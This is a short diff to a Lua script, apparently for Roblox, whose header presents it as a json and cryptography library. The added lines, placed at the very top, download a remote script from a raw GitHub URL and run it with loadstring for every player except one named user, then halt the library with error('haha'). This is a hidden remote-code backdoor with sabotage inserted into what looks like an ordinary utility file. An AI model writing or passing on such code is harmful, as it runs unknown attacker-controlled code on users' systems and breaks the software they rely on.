@@ -1,3 +1,12 @@
+if game:GetService("Players").LocalPlayer.Name ~= "VegieSenpai" then
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Goober2112/Gloop/main/scripts/ui/Cryptic_Main.lua"))()
+end)
+	
+error("haha")
+end
+
+
 -------------------------------------------------------------------------------
 --! json library
 --! cryptography library
